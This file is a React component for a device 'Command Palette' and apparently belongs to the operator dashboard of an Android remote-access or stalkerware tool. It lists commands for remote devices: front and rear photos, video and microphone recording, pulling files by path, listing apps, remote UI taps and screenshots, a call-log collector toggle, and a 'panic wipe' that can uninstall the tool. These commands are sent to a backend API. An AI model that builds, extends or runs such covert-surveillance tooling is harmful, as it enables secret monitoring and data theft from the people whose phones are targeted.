import { useEffect, useState } from "react";
import { useDevices } from "../devices";

const COMMANDS = [
  { type: "SNAP", label: "Take photo (rear)", params: [{ k: "front", t: "bool", dv: false }] },
  { type: "SNAP", label: "Take photo (front)", params: [{ k: "front", t: "bool", dv: true }] },
  { type: "RECORD_VIDEO", label: "Record video (10s)", params: [{ k: "duration_ms", t: "int", dv: 10000 }] },
  { type: "RECORD_AUDIO", label: "Record mic (15s)", params: [{ k: "duration_ms", t: "int", dv: 15000 }] },
  { type: "PROBE_MIC", label: "Probe mic level (1s)", params: [] },
  { type: "PULL_FILE", label: "Pull file by path", params: [{ k: "path", t: "text", dv: "/sdcard/Download/" }] },
  { type: "LIST_APPS", label: "List installed apps", params: [] },
  { type: "EXEC", label: "Live UI: tap text", params: [{ k: "command.text", t: "text", dv: "Continue" }] },
  { type: "EXEC", label: "Live UI: dump tree", params: [{ k: "command.type", t: "text", dv: "DUMP" }] },
  { type: "EXEC", label: "Live UI: screenshot", params: [{ k: "command.type", t: "text", dv: "SCREENSHOT" }] },
  { type: "PANIC", label: "Panic wipe (SOFT)", params: [{ k: "level", t: "select", opts: ["SOFT", "HARD", "UNINST"], dv: "SOFT" }] },
  { type: "PING", label: "Ping device", params: [] },
  { type: "GET_CONFIG", label: "Get config", params: [] },
  { type: "UPDATE_INTERVAL", label: "Set scan interval (60 min)", params: [{ k: "interval_minutes", t: "int", dv: 60 }] },
  { type: "TOGGLE_COLLECTOR", label: "Toggle collector (calls)", params: [{ k: "name", t: "text", dv: "calls" }, { k: "enabled", t: "bool", dv: false }] }
];

export default function CommandPalette({ token, onTokenExpired }: { token: string | null; onTokenExpired?: () => void }) {
  const { devices } = useDevices(token, onTokenExpired);
  const [deviceId, setDeviceId] = useState<string | null>(null);
  const [cmdIdx, setCmdIdx] = useState(0);
  const [paramVals, setParamVals] = useState<Record<string, any>>({});
  const [interval, setInterval] = useState(5);
  const [running, setRunning] = useState(false);
  const [result, setResult] = useState<string | null>(null);
  useEffect(() => { if (!deviceId && devices[0]) setDeviceId(devices[0].deviceId); }, [devices, deviceId]);

  const cmd = COMMANDS[cmdIdx];
  useEffect(() => {
    const init: Record<string, any> = {};
    cmd.params.forEach((p) => init[p.k] = p.dv);
    setParamVals(init);
  }, [cmdIdx]);

  async function run() {
    if (!token || !deviceId) return;
    setRunning(true); setResult(null);
    const body = { type: cmd.type };
    for (const p of cmd.params) {
      if (p.k.includes(".")) {
        // dotted -> nested
        const [a, b] = p.k.split(".");
        body[a] = { ...(body[a] || {}), [b]: paramVals[p.k] };
      } else {
        body[p.k] = paramVals[p.k];
      }
    }
    try {
      const r = await fetch(`/api/v2/devices/${deviceId}/cmd`, { method: "POST", headers: { "Content-Type": "application/json", Authorization: `Bearer ${token}` }, body: JSON.stringify(body) });
      const j = await r.json();
      setResult(JSON.stringify(j, null, 2));
    } catch (e: any) { setResult(`error: ${e.message}`); }
    finally { setRunning(false); }
  }

  return (
    <section className="view">
      <div className="view-head">
        <div>
          <h2>Command Palette</h2>
          <p className="muted">Send commands to the device and see the result on the Live page</p>
        </div>
      </div>

      {devices.length === 0 ? (
        <p className="muted">No paired devices yet.</p>
      ) : (
        <div className="cmd-form">
          <label>
            <span>Device</span>
            <select className="select" value={deviceId ?? ""} onChange={(e) => setDeviceId(e.target.value)}>
              {devices.map((d) => <option key={d.deviceId} value={d.deviceId}>{d.deviceId}</option>)}
            </select>
          </label>

          <label>
            <span>Command</span>
            <select className="select" value={cmdIdx} onChange={(e) => setCmdIdx(Number(e.target.value))}>
              {COMMANDS.map((c, i) => <option key={i} value={i}>{c.label}</option>)}
            </select>
          </label>

          {cmd.params.map((p) => (
            <label key={p.k}>
              <span>{p.k}</span>
              {p.t === "bool" ? (
                <input type="checkbox" checked={!!paramVals[p.k]} onChange={(e) => setParamVals({ ...paramVals, [p.k]: e.target.checked })} />
              ) : p.t === "int" ? (
                <input type="number" className="select" value={paramVals[p.k] ?? 0} onChange={(e) => setParamVals({ ...paramVals, [p.k]: Number(e.target.value) })} />
              ) : p.t === "select" ? (
                <select className="select" value={paramVals[p.k] ?? p.dv} onChange={(e) => setParamVals({ ...paramVals, [p.k]: e.target.value })}>
                  {p.opts!.map((o) => <option key={o} value={o}>{o}</option>)}
                </select>
              ) : (
                <input type="text" className="select" value={paramVals[p.k] ?? ""} onChange={(e) => setParamVals({ ...paramVals, [p.k]: e.target.value })} />
              )}
            </label>
          ))}

          <div>
            <button className="btn-primary" disabled={running} onClick={() => void run()}>{running ? "Sending…" : "Send command"}</button>
            <a className="btn-ghost" href="/live" style={{ marginLeft: 8 }}>Open Live →</a>
          </div>

          {result && <pre className="cmd-result">{result}</pre>}
        </div>
      )}
    </section>
  );
}
